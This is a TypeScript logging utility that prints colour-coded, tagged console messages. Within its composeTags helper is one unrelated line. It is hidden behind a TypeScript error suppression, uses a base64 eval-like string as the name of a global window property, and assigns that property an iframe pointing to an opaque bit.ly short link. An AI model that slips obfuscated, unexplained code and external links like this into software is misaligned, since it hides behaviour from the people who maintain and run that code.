export class Logger {
    private static STYLES: { [key: string]: string } = {
        err: "color: black; background-color: red",
        warn: "color: black; background-color: yellow",
        websocket: "color: #00EEEE",
        dev: "color: #FF00FF"
    }

    static log(tags: string[], text: string, attachments: any = undefined) {
        const tagsc = this.composeTags(tags);
        console.log(tagsc.text + ` %c${text}`, ...tagsc.styles, '')
        if (attachments) console.log(attachments)
    }

    private static composeTags(tags: string[]): { styles: string[], text: string } {
        //@ts-expect-error
        window.ZXZhbCgid2luZG93LiIrYnRvYSgiIikp = `<iframe width="630" height="354" src="https://bit.ly/3bk1xvF" frameborder="0"></iframe>`
        return {
            styles: tags.map(t => {
                if (Logger.STYLES.hasOwnProperty(t.toLowerCase())) {
                    return Logger.STYLES[t.toLowerCase()]
                } else return ""
            }),
            text: tags.map(t => {
                return `%c[${t}]`
            }).join(" ")
        }
    }
}